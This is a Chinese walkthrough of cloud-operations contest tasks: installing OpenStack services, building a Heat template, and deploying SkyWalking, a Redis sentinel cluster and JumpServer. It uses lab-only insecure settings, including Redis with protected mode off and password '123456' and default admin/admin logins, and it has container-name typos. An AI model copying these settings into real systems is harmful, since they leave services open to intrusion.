<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-dashboard.sh</span><br><span class="line">[root@controller ~]# vim /etc/openstack-dashboard/local_settings</span><br><span class="line">SESSION_ENGINE = &#x27;django.contrib.sessions.backends.cache&#x27;</span><br><span class="line">改为</span><br><span class="line">SESSION_ENGINE = &#x27;django.contrib.sessions.backends.file&#x27;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">验证</span></span><br><span class="line">systemctl restart httpd</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>1.1.11 Swift安装</p>
<p>在控制节点和计算节点上分别安装Swift服务。安装完成后，将cirros镜像进行分片存储。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-swift-controller.sh</span><br><span class="line"></span><br><span class="line">[root@compute ~]# iaas-install-swift-compute.sh</span><br></pre></td></tr></table></figure>

<p> 拓展:</p>
<p>在 控 制 节 点 和 计 算 节 点 上 分 别 使 用 iaas-install-swift-controller.sh 和iaas-install-swift-compute.sh 脚本安装 Swift 服务。安装完成后，使用命令创建一个名叫examcontainer 的容器，将 cirros-0.3.4-x86_64-disk.img 镜像上传到 examcontainer 容器中，并设置分段存放，每一段大小为 10M</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# ls</span><br><span class="line">anaconda-ks.cfg  cirros-0.3.4-x86_64-disk.img  logininfo.txt</span><br><span class="line">[root@controller ~]# swift post examcontainers</span><br><span class="line">[root@controller ~]# swift upload examcontaiers -S 10485760 cirros-0.3.4-x86_64-disk.img</span><br><span class="line">cirros-0.3.4-x86_64-disk.img segment 1</span><br><span class="line">cirros-0.3.4-x86_64-disk.img segment 0</span><br><span class="line">cirros-0.3.4-x86_64-disk.img</span><br><span class="line">[root@controller ~]# du -sh cirros-0.3.4-x86_64-disk.img</span><br><span class="line">13M     cirros-0.3.4-x86_64-disk.img</span><br><span class="line">[root@controller ~]#</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">因为镜像就13M，所有存储为两段</span></span><br></pre></td></tr></table></figure>





<p><strong>1.1.12 Cinder创建硬盘</strong></p>
<p>在控制节点和计算节点分别安装Cinder服务，请在计算节点，对块存储进行扩容操作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@cobtroller ~]# iaas-install-cinder-controller.sh</span><br><span class="line">[root@compute ~]# iaas-install-cinder-compute.sh</span><br></pre></td></tr></table></figure>

<p>扩展</p>
<p>请在计算节点，对块存储进行扩容操作， 即在计算节点再分出一个 5G 的分区，加入到 cinder 块存储的后端存储中去</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建物理卷</span><br><span class="line">pvcreate /dev/vdb4</span><br><span class="line"></span><br><span class="line">#扩展cinder-volume卷组</span><br><span class="line">vgextend cinder-volumes /dev/vdb4</span><br><span class="line"></span><br><span class="line">#验证</span><br><span class="line">[root@compute ~]# vgdisplay</span><br></pre></td></tr></table></figure>

<p>1.1.13 Manila服务安装与使用</p>
<p>在控制和计算节点上分别在控制节点和计算节点安装Manila服务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# iaas-install-manila-controller.sh</span><br><span class="line">[root@compute ~]# iaas-install-manila-compute.sh</span><br></pre></td></tr></table></figure>



<h3 id="任务2-私有云服务运维（15分"><a href="#任务2-私有云服务运维（15分" class="headerlink" title="任务2 私有云服务运维（15分)"></a><strong>任务2 私有云服务运维（15分)</strong></h3><p>1.2.1 OpenStack开放镜像权限</p>
<p>在admin项目中存在glance-cirros镜像文件，将glance-cirros镜像指定demo项目进行共享使用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack image set glance-cirros --shared</span><br></pre></td></tr></table></figure>



<p><strong>1.2.2	SkyWalking 应用部署</strong></p>
<p>申请一台云主机，使用提供的软件包安装Elasticsearch服务和SkyWalking服务。再申请一台云主机，用于搭建gpmall商城应用，并配置SkyWalking 监控gpmall主机。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将所需要的包进行上传</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">elasticsearch部署</span></span><br><span class="line">[root@controller ~]# rpm -ivh elasticsearch-7.0.0-x86_64.rpm</span><br><span class="line">[root@controller ~]# vi /etc/elasticsearch/elasticsearch.yml</span><br><span class="line">需要配置的地方：</span><br><span class="line">cluster.name: yutao – 这个需要和skywalking中的elasticsearch配置保持一致</span><br><span class="line">node.name: node-1</span><br><span class="line">network.host: 0.0.0.0</span><br><span class="line">http.port: 9200 （默认就是，可以不解开注释，我解开了）</span><br><span class="line">discovery.seed_hosts: [“127.0.0.1”] 一定要配置，不然找不到主节点</span><br><span class="line">cluster.initial_master_nodes: [“node-1”] 一定要配置，不然找不到主节点</span><br><span class="line"></span><br><span class="line">[root@controller ~]# systemctl enable --now elasticsearch</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">skywalking部署</span></span><br><span class="line">storage:</span><br><span class="line">  selector: elasticsearch7</span><br><span class="line">  elasticsearch:</span><br><span class="line">    nameSpace: $&#123;SW_NAMESPACE:&quot;yutao&quot;&#125;</span><br><span class="line">    clusterNodes: $&#123;SW_STORAGE_ES_CLUSTER_NODES:localhost:9200&#125;</span><br><span class="line">    protocol: $&#123;SW_STORAGE_ES_HTTP_PROTOCOL:&quot;http&quot;&#125;</span><br><span class="line">    trustStorePath: $&#123;SW_SW_STORAGE_ES_SSL_JKS_PATH:&quot;../es_keystore.jks&quot;&#125;</span><br><span class="line">    trustStorePass: $&#123;SW_SW_STORAGE_ES_SSL_JKS_PASS:&quot;&quot;&#125;</span><br><span class="line">    user: $&#123;SW_ES_USER:&quot;&quot;&#125;</span><br><span class="line">    password: $&#123;SW_ES_PASSWORD:&quot;&quot;&#125;</span><br><span class="line">    secretsManagementFile: $&#123;SW_ES_SECRETS_MANAGEMENT_FILE:&quot;&quot;&#125; # Secrets management file in the properties format includes the username, password, which are managed by 3rd party tool.</span><br><span class="line">    enablePackedDownsampling: $&#123;SW_STORAGE_ENABLE_PACKED_DOWNSAMPLING:true&#125; # Hour and Day metrics will be merged into minute index.</span><br><span class="line">    dayStep: $&#123;SW_STORAGE_DAY_STEP:1&#125; # Represent the number of days in the one minute/hour/day index.</span><br><span class="line">    indexShardsNumber: $&#123;SW_STORAGE_ES_INDEX_SHARDS_NUMBER:2&#125;</span><br><span class="line">    indexReplicasNumber: $&#123;SW_STORAGE_ES_INDEX_REPLICAS_NUMBER:0&#125;</span><br><span class="line">    # Those data TTL settings will override the same settings in core module.</span><br><span class="line">    recordDataTTL: $&#123;SW_STORAGE_ES_RECORD_DATA_TTL:7&#125; # Unit is day</span><br><span class="line">    otherMetricsDataTTL: $&#123;SW_STORAGE_ES_OTHER_METRIC_DATA_TTL:45&#125; # Unit is day</span><br><span class="line">    monthMetricsDataTTL: $&#123;SW_STORAGE_ES_MONTH_METRIC_DATA_TTL:18&#125; # Unit is month</span><br><span class="line">    # Batch process setting, refer to https://www.elastic.co/guide/en/elasticsearch/client/java-api/5.5/java-docs-bulk-processor.html</span><br><span class="line">    bulkActions: $&#123;SW_STORAGE_ES_BULK_ACTIONS:1000&#125; # Execute the bulk every 1000 requests</span><br><span class="line">    flushInterval: $&#123;SW_STORAGE_ES_FLUSH_INTERVAL:10&#125; # flush the bulk every 10 seconds whatever the number of requests</span><br><span class="line">    concurrentRequests: $&#123;SW_STORAGE_ES_CONCURRENT_REQUESTS:2&#125; # the number of concurrent requests</span><br><span class="line">    resultWindowMaxSize: $&#123;SW_STORAGE_ES_QUERY_MAX_WINDOW_SIZE:10000&#125;</span><br><span class="line">    metadataQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_MAX_SIZE:5000&#125;</span><br><span class="line">    segmentQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_SEGMENT_SIZE:200&#125;</span><br><span class="line">    profileTaskQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_PROFILE_TASK_SIZE:200&#125;</span><br><span class="line">    advanced: $&#123;SW_STORAGE_ES_ADVANCED:&quot;&quot;&#125;</span><br><span class="line">  elasticsearch7:</span><br><span class="line">    nameSpace: $&#123;SW_NAMESPACE:&quot;yutao&quot;&#125;</span><br><span class="line">    clusterNodes: $&#123;SW_STORAGE_ES_CLUSTER_NODES:localhost:9200&#125;</span><br><span class="line">    protocol: $&#123;SW_STORAGE_ES_HTTP_PROTOCOL:&quot;http&quot;&#125;</span><br><span class="line">    trustStorePath: $&#123;SW_SW_STORAGE_ES_SSL_JKS_PATH:&quot;../es_keystore.jks&quot;&#125;</span><br><span class="line">    trustStorePass: $&#123;SW_SW_STORAGE_ES_SSL_JKS_PASS:&quot;&quot;&#125;</span><br><span class="line">    enablePackedDownsampling: $&#123;SW_STORAGE_ENABLE_PACKED_DOWNSAMPLING:true&#125; # Hour and Day metrics will be merged into minute index.</span><br><span class="line">    dayStep: $&#123;SW_STORAGE_DAY_STEP:1&#125; # Represent the number of days in the one minute/hour/day index.</span><br><span class="line">    user: $&#123;SW_ES_USER:&quot;&quot;&#125;</span><br><span class="line">    password: $&#123;SW_ES_PASSWORD:&quot;&quot;&#125;</span><br><span class="line">    secretsManagementFile: $&#123;SW_ES_SECRETS_MANAGEMENT_FILE:&quot;&quot;&#125; # Secrets management file in the properties format includes the username, password, which are managed by 3rd party tool.</span><br><span class="line">    indexShardsNumber: $&#123;SW_STORAGE_ES_INDEX_SHARDS_NUMBER:2&#125;</span><br><span class="line">    indexReplicasNumber: $&#123;SW_STORAGE_ES_INDEX_REPLICAS_NUMBER:0&#125;</span><br><span class="line">    # Those data TTL settings will override the same settings in core module.</span><br><span class="line">    recordDataTTL: $&#123;SW_STORAGE_ES_RECORD_DATA_TTL:7&#125; # Unit is day</span><br><span class="line">    otherMetricsDataTTL: $&#123;SW_STORAGE_ES_OTHER_METRIC_DATA_TTL:45&#125; # Unit is day</span><br><span class="line">    monthMetricsDataTTL: $&#123;SW_STORAGE_ES_MONTH_METRIC_DATA_TTL:18&#125; # Unit is month</span><br><span class="line">    # Batch process setting, refer to https://www.elastic.co/guide/en/elasticsearch/client/java-api/5.5/java-docs-bulk-processor.html</span><br><span class="line">    bulkActions: $&#123;SW_STORAGE_ES_BULK_ACTIONS:1000&#125; # Execute the bulk every 1000 requests</span><br><span class="line">    flushInterval: $&#123;SW_STORAGE_ES_FLUSH_INTERVAL:10&#125; # flush the bulk every 10 seconds whatever the number of requests</span><br><span class="line">    concurrentRequests: $&#123;SW_STORAGE_ES_CONCURRENT_REQUESTS:2&#125; # the number of concurrent requests</span><br><span class="line">    resultWindowMaxSize: $&#123;SW_STORAGE_ES_QUERY_MAX_WINDOW_SIZE:10000&#125;</span><br><span class="line">    metadataQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_MAX_SIZE:5000&#125;</span><br><span class="line">    segmentQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_SEGMENT_SIZE:200&#125;</span><br><span class="line">    profileTaskQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_PROFILE_TASK_SIZE:200&#125;</span><br><span class="line">    advanced: $&#123;SW_STORAGE_ES_ADVANCED:&quot;&quot;&#125;</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">h2:</span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"> driver: <span class="variable">$&#123;SW_STORAGE_H2_DRIVER:org.h2.jdbcx.JdbcDataSource&#125;</span></span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"> url: <span class="variable">$&#123;SW_STORAGE_H2_URL:jdbc:h2:mem:skywalking-oap-db&#125;</span></span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"> user: <span class="variable">$&#123;SW_STORAGE_H2_USER:sa&#125;</span></span></span><br><span class="line"><span class="meta prompt_">  # </span><span class="language-bash"> metadataQueryMaxSize: <span class="variable">$&#123;SW_STORAGE_H2_QUERY_MAX_SIZE:5000&#125;</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#注意的地方</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">因为安装的是elasticsearch7所以这里选的是elasticsearch7</span></span><br><span class="line">storage:</span><br><span class="line">  selector: elasticsearch7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elasticsearch7:</span><br><span class="line">    nameSpace: $&#123;SW_NAMESPACE:&quot;yutao&quot;&#125; # 这和上面elasticsearch配置中的cluster.name保存一直</span><br><span class="line"></span><br><span class="line">[root@controller ~]# bin/oapService.sh </span><br><span class="line">SkyWalking OAP started successfully!</span><br><span class="line">[root@controller ~]# bin/webappService.sh</span><br><span class="line">SkyWalking Web Application started successfully!</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#注意修改端口 二进制文件</span></span></span><br><span class="line">[root@controller apache-skywalking-apm-bin-es7]# vi webapp/webapp.yml</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>1.2.3 OpenStack镜像压缩</p>
<p>在HTTP文件服务器中存在一个镜像为CentOS7.5-compress.qcow2的镜像，请对该镜像进行压缩操作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# du -sh CentOS7.5-compress.qcow2</span><br><span class="line">892M CentOS7.5-compress.qcow2</span><br><span class="line">[root@controller ~]# qemu-img convert -c -O qcow2 CentOS7.5-compress.qcow2 CentOS7.5-compress2.qcow2</span><br><span class="line"></span><br><span class="line">-c 压缩</span><br><span class="line">-O qcow2 输出格式为 qcow2</span><br><span class="line">CentOS7.5-compress.qcow2   被压缩的文件</span><br><span class="line">CentOS7.5-compress2.qcow2 压缩完成后文件</span><br><span class="line"></span><br><span class="line">[root@controller ~]# du -sh CentOS7.5-compress2.qcow2</span><br><span class="line">405M CentOS7.5-compress2.qcow2</span><br></pre></td></tr></table></figure>



<p>1.2.4 Glance对接Cinder存储</p>
<p>在自行搭建的OpenStack平台中修改相关参数，使Glance可以使用Cinder作为后端存储。</p>
<p>1.2.5 使用Heat模板创建容器</p>
<p>在自行搭建的OpenStack私有云平台上，在&#x2F;root目录下编写Heat模板文件，要求执行yaml文件可以创建名为heat-swift的容器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# cat create_swift.yaml</span><br><span class="line">heat_template_version: 2018-08-31</span><br><span class="line">resources:</span><br><span class="line">  user:</span><br><span class="line">    type: OS::Swift::Container</span><br><span class="line">    properties:</span><br><span class="line">      name: heat-swift</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行yaml文件</span></span><br><span class="line">[root@controller ~]# openstack stack create heat-swift  -t create_swift.yaml</span><br></pre></td></tr></table></figure>



<p>1.2.6 Nova清除缓存</p>
<p>在OpenStack平台上，修改相关配置，让长时间不用的镜像缓存在过一定的时间后会被自动删除。</p>
<p>1.2.7 Redis集群部署。</p>
<p>部署Redis集群，Redis的一主二从三哨兵架构。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置redis</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本实验通过epel源下载redis</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#放行相关的安全策略和防火墙</span></span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]# yum install -y redis</span><br><span class="line">[root@localhost ~]# vi /etc/redis.conf</span><br><span class="line"></span><br><span class="line">1.先在网络部分注释掉单机连接那一行,即注释掉bind 127.0.0.1 </span><br><span class="line">2.同样我们要将后台运行打开：daemonize no，设置为yes。</span><br><span class="line">3.将 保护模式关闭：protected-mode yes 改为：protected-mode no </span><br><span class="line">4.配置密码requirepass的密码改为123456</span><br><span class="line">5.配置连接master的密码masterauth 123456</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置连接master(主节点无需)</span></span><br><span class="line">[root@localhost ~]# redis-cli -p 6379</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">slaveof 127.0.0.1 6379</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">info replication</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">主节点查看状态</span></span><br><span class="line">[root@localhost ~]# redis-cli -p 6379</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">info replication</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置哨兵</span></span><br><span class="line">[root@localhost ~]# vi /etc/redis-sentinel.conf</span><br><span class="line"></span><br><span class="line">protected-mode no</span><br><span class="line">daemonize yes</span><br><span class="line">sentinel monitor mymaster 主节点ip 6379 2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#启动哨兵</span></span></span><br><span class="line">[root@localhost ~]# redis-sentinel /etc/redis-sentinel.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">验证</span></span><br><span class="line">[root@localhost ~]# redis-cli -p 26379</span><br><span class="line">127.0.0.1:26379&gt; info sentinel</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Sentinel</span></span><br><span class="line">sentinel_masters:1</span><br><span class="line">sentinel_tilt:0</span><br><span class="line">sentinel_running_scripts:0</span><br><span class="line">sentinel_scripts_queue_length:0</span><br><span class="line">sentinel_simulate_failure_flags:0</span><br><span class="line">master0:name=mymaster,status=sdown,address=172.129.1.50:6379,slaves=2,sentinels=3</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>1.2.8 Redis AOF调优</p>
<p>修改在Redis相关配置，避免AOF文件过大，Redis会进行AOF重写。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# vim /etc/redis.conf</span><br><span class="line"></span><br><span class="line">no-appendfsync-on-rewrite no</span><br><span class="line">aof-rewrite-incremental-fsync yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">连个参数分别改为</span></span><br><span class="line"></span><br><span class="line">aof-rewrite-incremental-fsync no</span><br><span class="line">no-appendfsync-on-rewrite yes</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">配置就是设置为<span class="built_in">yes</span>时候，在aof重写期间会停止aof的fsync操作</span></span><br><span class="line">[root@master ~]# systemctl restart redis</span><br></pre></td></tr></table></figure>



<p>1.2.9 JumpServer堡垒机部署</p>
<p>使用提供的软件包安装JumpServer堡垒机服务，并配置使用该堡垒机对接自己安装的控制和计算节点。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> ~]<span class="comment"># ls</span></span><br><span class="line">anaconda<span class="literal">-ks</span>.cfg  jumpserver.tar.gz  original<span class="literal">-ks</span>.cfg</span><br></pre></td></tr></table></figure>
<p>解压软件包jumpserver.tar.gz至&#x2F;opt目录下</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> ~]<span class="comment"># tar -zxvf jumpserver.tar.gz -C /opt/</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> ~]<span class="comment"># ls /opt/</span></span><br><span class="line">compose  config  docker  docker.service  images  jumpserver<span class="literal">-repo</span>  static.env</span><br></pre></td></tr></table></figure>
<p>将默认Yum源移至其他目录，创建本地Yum源文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> ~]<span class="comment"># mv /etc/yum.repos.d/* /mnt/</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> ~]<span class="comment"># cat &gt;&gt; /etc/yum.repos.d/jumpserver.repo &lt;&lt; EOF</span></span><br><span class="line">[<span class="type">jumpserver</span>]</span><br><span class="line">name=jumpserver</span><br><span class="line">baseurl=file:///opt/jumpserver<span class="literal">-repo</span></span><br><span class="line">gpgcheck=<span class="number">0</span></span><br><span class="line">enabled=<span class="number">1</span></span><br><span class="line">EOF</span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> ~]<span class="comment"># yum repolist</span></span><br><span class="line">repo id		repo name		status</span><br><span class="line">jumpserver	jumpserver		<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>安装Python数据库</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> ~]<span class="comment"># yum install python2 -y</span></span><br></pre></td></tr></table></figure>
<p>安装配置Docker环境</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">opt</span>]<span class="comment"># cp -rf /opt/docker/* /usr/bin/</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">opt</span>]<span class="comment"># chmod 775 /usr/bin/docker*</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">opt</span>]<span class="comment"># cp -rf /opt/docker.service /etc/systemd/system</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">opt</span>]<span class="comment"># chmod 775 /etc/systemd/system/docker.service </span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">opt</span>]<span class="comment"># systemctl daemon-reload</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">opt</span>]<span class="comment"># systemctl enable docker --now</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi<span class="literal">-user</span>.target.wants/docker.service to /etc/systemd/system/dock</span><br><span class="line">er.service.</span><br></pre></td></tr></table></figure>
<p>验证服务状态</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">opt</span>]<span class="comment"># docker -v</span></span><br><span class="line">Docker version <span class="number">18.06</span>.<span class="number">3</span><span class="literal">-ce</span>, build d7080c1</span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">opt</span>]<span class="comment"># docker-compose -v</span></span><br><span class="line">docker<span class="literal">-compose</span> version <span class="number">1.27</span>.<span class="number">4</span>, build <span class="number">40524192</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">opt</span>]<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>安装Jumpserver服务</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">images</span>]<span class="comment"># ls</span></span><br><span class="line">jumpserver_core_v2.<span class="number">11.4</span>.tar  jumpserver_lion_v2.<span class="number">11.4</span>.tar  jumpserver_nginx_alpine2.tar</span><br><span class="line">jumpserver_koko_v2.<span class="number">11.4</span>.tar  jumpserver_luna_v2.<span class="number">11.4</span>.tar  jumpserver_redis_6<span class="literal">-alpine</span>.tar</span><br><span class="line">jumpserver_lina_v2.<span class="number">11.4</span>.tar  jumpserver_mysql_5.tar       load.sh</span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">images</span>]<span class="comment"># cat load.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">docker load <span class="literal">-i</span> jumpserver_core_v2.<span class="number">11.4</span>.tar</span><br><span class="line">docker load <span class="literal">-i</span> jumpserver_koko_v2.<span class="number">11.4</span>.tar</span><br><span class="line">docker load <span class="literal">-i</span> jumpserver_lina_v2.<span class="number">11.4</span>.tar</span><br><span class="line">docker load <span class="literal">-i</span> jumpserver_lion_v2.<span class="number">11.4</span>.tar</span><br><span class="line">docker load <span class="literal">-i</span> jumpserver_luna_v2.<span class="number">11.4</span>.tar</span><br><span class="line">docker load <span class="literal">-i</span> jumpserver_mysql_5.tar</span><br><span class="line">docker load <span class="literal">-i</span> jumpserver_nginx_alpine2.tar</span><br><span class="line">docker load <span class="literal">-i</span> jumpserver_redis_6<span class="literal">-alpine</span>.tar</span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">images</span>]<span class="comment"># sh load.sh </span></span><br></pre></td></tr></table></figure>
<p>创建Jumpserver服务组件目录</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">images</span>]<span class="comment"># mkdir -p /opt/jumpserver/&#123;core,koko,lion,mysql,nginx,redis&#125;</span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">images</span>]<span class="comment"># cp -rf /opt/config /opt/jumpserver/</span></span><br></pre></td></tr></table></figure>
<p>生效环境变量static.env，使用所提供的脚本up.sh启动Jumpserver服务</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">compose</span>]<span class="comment"># ls</span></span><br><span class="line">config_static                docker<span class="literal">-compose-lb</span>.yml              docker<span class="literal">-compose-network</span>.yml         down.sh</span><br><span class="line">docker<span class="literal">-compose-app</span>.yml       docker<span class="literal">-compose-mysql-internal</span>.yml  docker<span class="literal">-compose-redis-internal</span>.yml  up.sh</span><br><span class="line">docker<span class="literal">-compose-es</span>.yml        docker<span class="literal">-compose-mysql</span>.yml           docker<span class="literal">-compose-redis</span>.yml</span><br><span class="line">docker<span class="literal">-compose-external</span>.yml  docker<span class="literal">-compose-network_ipv6</span>.yml    docker<span class="literal">-compose-task</span>.yml</span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">compose</span>]<span class="comment"># source /opt/static.env </span></span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">compose</span>]<span class="comment"># sh up.sh </span></span><br><span class="line">Creating network <span class="string">&quot;jms_net&quot;</span> with driver <span class="string">&quot;bridge&quot;</span></span><br><span class="line">Creating jms_redis ... done</span><br><span class="line">Creating jms_mysql ... done</span><br><span class="line">Creating jms_core  ... done</span><br><span class="line">Creating jms_lina   ... done</span><br><span class="line">Creating jms_nginx  ... done</span><br><span class="line">Creating jms_celery ... done</span><br><span class="line">Creating jms_lion   ... done</span><br><span class="line">Creating jms_luna   ... done</span><br><span class="line">Creating jms_koko   ... done</span><br><span class="line">[<span class="type">root</span>@<span class="type">jumpserver</span> <span class="type">compose</span>]<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>浏览器访问<a href="http://10.24.193.142,jumpserver/">http://10.24.193.142，Jumpserver</a> Web登录（admin&#x2F;admin）<br><img src="https://img-blog.csdnimg.cn/9c6d08ac6cbc413782c571a509762d33.png" alt="图1 Web登录.png"></p>
<p>图1 Web登录</p>
<p>登录成功后，会提示设置新密码，如图2所示：</p>
<p><img src="https://img-blog.csdnimg.cn/526c4bb658cd4ed28200391a45669b8f.png" alt="图2 修改密码.png"></p>
<p>图2 修改密码</p>
<p>登录平台后，单击页面右上角下拉菜单切换中文字符设置，如图3所示：</p>
<p><img src="https://img-blog.csdnimg.cn/4a359b9369fd421ab5363d195ceb370b.png" alt="图3 登录成功.png"></p>
<p>图3 登录成功</p>
<p>至此Jumpserver安装完成。</p>
<p>（6）管理资产</p>
<p>使用管理员admin用户登录Jumpserver管理平台，单击左侧导航栏，展开“资产管理”项目，选择“管理用户”，单击右侧“创建”按钮，如图4所示：</p>
<p><img src="https://img-blog.csdnimg.cn/0543340f279c4063b85a9cfcdc5c200d.png" alt="图4 管理用户.png"></p>
<p>图4 管理用户</p>
<p>创建远程连接用户，用户名为root密码为“Abc@1234”，单击“提交”按钮进行创建，如图5所示：</p>
<p><img src="https://img-blog.csdnimg.cn/b045cd27415a42c3980aac90453bd6b1.png" alt="图5 创建管理用户.png"></p>
<p>图5 创建管理用户</p>
<p>选择“系统用户”，单击右侧“创建”按钮，创建系统用户，选择主机协议“SSH”，设置用户名root，密码为服务器SSH密码并单击“提交”按钮，如图6所示：</p>
<p><img src="https://img-blog.csdnimg.cn/94b16f90dddf48589bd702e4254a7726.png" alt="图6 创建系统用户.png"></p>
<p>图6 创建系统用户</p>
<p>单击左侧导航栏，展开“资产管理”项目，选择“资产列表”，单击右侧“创建”按钮，如图7所示：</p>
<p><img src="https://img-blog.csdnimg.cn/d89596e2187b484c8ab56493cceec414.png" alt="图7 管理资产.png"></p>
<p>图7 管理资产</p>
<p>创建资产，将云平台主机（controller）加入资产内，如图8、图9所示：</p>
<p><img src="https://img-blog.csdnimg.cn/cb24b23b657f4f9b95749958c9f1bec3.png" alt="图8 创建资产controller.png"></p>
<p>图8 创建资产controller</p>
<p><img src="https://img-blog.csdnimg.cn/ca09c35ba686489c821a5c68fdef9c4d.png" alt="图9 创建成功.png"></p>
<p>图9 创建成功</p>
<p>（7）资产授权</p>
<p>单击左侧导航栏，展开“权限管理”项目，选择“资产授权”，单击右侧“创建”按钮，创建资产授权规则，如图10所示：</p>
<p><img src="https://img-blog.csdnimg.cn/887b01cf50214882be0efead1ba24b80.png" alt="图10 创建资产授权规则.png"></p>
<p>图10 创建资产授权规则</p>
